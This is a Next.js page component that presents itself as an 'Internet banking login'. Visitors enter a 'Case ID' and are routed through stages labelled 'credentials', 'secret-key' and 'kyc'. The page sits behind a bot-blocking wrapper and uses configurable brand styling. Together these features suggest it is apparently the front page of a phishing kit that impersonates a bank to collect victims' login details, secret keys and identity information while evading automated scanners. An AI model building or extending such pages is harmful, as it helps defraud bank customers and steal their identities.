'use client';

/**
 * Landing/Home Page
 *
 * Entry point for customer-initiated verification path
 * Customer enters case ID and is redirected to session UUID
 */

import { useCallback, useState } from 'react';
import { useRouter } from 'next/navigation';
import { currentBrand } from '@/config/branding';
import { useSessionStore } from '@shared';
import { BotGuard } from '@/components/security/BotGuard';
import { Sidebar } from '@/components/layout/Sidebar';
import Image from 'next/image';

export default function HomePage() {
  const router = useRouter();

  const [caseId, setCaseId] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  /**
   * Handle case ID submission
   */
  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setError('');

      if (!caseId.trim()) {
        setError('Please enter your case ID');
        return;
      }

      setIsLoading(true);

      try {
        // Lookup existing session by case ID
        const response = await fetch('/api/session/lookup-by-case-id', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            caseId: caseId.trim(),
          }),
        });

        if (!response.ok) {
          const errorJson = await response.json();
          setError(
            errorJson.error || 'Unable to validate case ID. Please try again.'
          );
          return;
        }

        const data = await response.json();
        const sessionUuid = data.sessionUuid;
        const returnedCaseId = data.caseId;
        const currentStage = data.next_step || 'credentials'; // Backend returns current stage
        const guestToken = data.guestToken;

        if (!sessionUuid) {
          setError('Unable to validate case ID. Please try again.');
          return;
        }

        // Map stage name to route (secret_key -> secret-key)
        const stageToRoute: Record<string, string> = {
          'secret_key': 'secret-key',
          'credentials': 'credentials',
          'kyc': 'kyc',
          'completed': 'completed',
          'terminated': 'terminated',
        };
        const route = stageToRoute[currentStage] || 'credentials';

        // Store session UUID, case ID, and guest token in session store
        useSessionStore.setState({
          sessionUuid,
          caseId: returnedCaseId,
          guestToken,
          stage: currentStage as any,
        });

        // Redirect to current stage (session resumption)
        router.push(`/${sessionUuid}/${route}`);
      } catch (error) {
        console.error('Error:', error);
        setError('Unable to validate case ID. Please try again.');
      } finally {
        setIsLoading(false);
      }
    },
    [caseId, router]
  );

  return (
    <BotGuard>
      <div className="flex gap-[30px] items-start pt-[20px] pb-[40px] max-w-[957px] px-[18px] mx-auto md:flex-row flex-col text-[#333]">
        {/* Left Column */}
        <div className="flex-1 w-full max-w-[730px]">
          <h1 className="text-[36px] font-[500] text-black mb-[20px] pl-[8px] leading-[44px]">Internet banking login</h1>

          {/* Login Card */}
          <div className="bg-[#f2f2f2] w-full">
            <fieldset className="w-full border-0 p-0 m-0">
              <legend className="w-full bg-gradient-to-b from-[#f0f0f0] to-[#dedede] border-b border-[#969696] px-[8px] py-[6px] text-[14px] font-bold text-[#34423e] block mb-0 font-sans">Enter your login details</legend>

              <ol className="list-none m-0 p-[8px]">
                <li className="block py-[8px] overflow-hidden border-t-0">
                  <label htmlFor="caseId" className="float-left w-[120px] mr-[15px] pt-[2px] text-[12px] text-[#444444] text-left font-normal leading-[18px]">Case ID:</label>
                  <input
                    type="text"
                    id="caseId"
                    className="float-left w-[calc(100%-170px)] max-w-[280px] h-[18px] p-[2px] px-[4px] border border-[#777777] text-[12px] text-[#333] bg-white rounded-none focus:outline-[2px] focus:outline-[#101010] focus:outline-offset-0 focus:border-[#777777]"
                    value={caseId}
                    onChange={(e) => setCaseId(e.target.value)}
                    disabled={isLoading}
                    required
                    autoComplete="off"
                  />
                  {error && <div className="clear-both pt-2 text-red-600 text-[12px] pl-[135px]">{error}</div>}
                </li>
              </ol>

              {/* Actions */}
              <div className="p-[12px] pb-[8px] px-[8px] border-t border-[#d5d5d5] mt-[4px] overflow-hidden">
                <div className="float-left inline-flex items-center h-[24px] bg-[#00baef] rounded-[12px] pr-[8px]">
                  <span className="flex items-center">
                    <button
                      onClick={handleSubmit}
                      disabled={isLoading}
                      className="bg-transparent border-0 text-white font-[400] text-[12px] h-[24px] pl-[12px] pr-[2px] cursor-pointer hover:underline focus:outline-none whitespace-nowrap font-sans"
                    >
                      {isLoading ? 'Processing...' : 'Continue'}
                    </button>
                  </span>
                  <span className="w-[20px] h-[20px] ml-[8px] bg-[url('/bg-padlock-sprite.png')] bg-no-repeat bg-[length:20px_auto] bg-[0_0]"></span>
                </div>
                <a href="#" className="float-left ml-[12px] leading-[24px] text-[12px] text-[#009de5] hover:underline">Cancel</a>
              </div>
            </fieldset>
          </div>
        </div>

        {/* Right Sidebar */}
        <Sidebar />
      </div>
    </BotGuard>
  );
}
